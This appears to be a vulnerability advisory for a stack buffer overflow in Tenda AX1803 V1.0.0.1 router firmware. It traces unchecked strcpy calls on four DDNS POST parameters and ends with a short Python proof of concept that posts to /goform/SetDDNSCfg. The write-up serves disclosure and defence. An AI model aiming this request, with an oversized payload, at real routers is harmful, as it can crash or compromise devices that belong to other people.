## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3421.html

## Affected version

AX1803 V1.0.0.1

## Vulnerability details

The Tenda AX1803 V1.0.0.1 firmware has a stack overflow vulnerability in the `formSetSysToolDDNS` function. The `v3, v4, v5, v6` variable receives the `serverName, ddnsUser, ddnsPwd, ddnsDomain` parameter from a POST request. However, since the user can control the input of `serverName, ddnsUser, ddnsPwd, ddnsDomain`, the statement `strcpy` can cause a buffer overflow. The user-provided `serverName, ddnsUser, ddnsPwd, ddnsDomain` can exceed the capacity of the `s2, v19, v18, v17` array, triggering this security vulnerability.

![image-20240418171524535](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418171524535.png)

![image-20240418171509126](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418171509126.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetDDNSCfg"
payload = "a"*1

data = {"serverName": payload}
# data = {"ddnsUser": payload}
# data = {"ddnsPwd": payload}
# data = {"ddnsDomain": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)
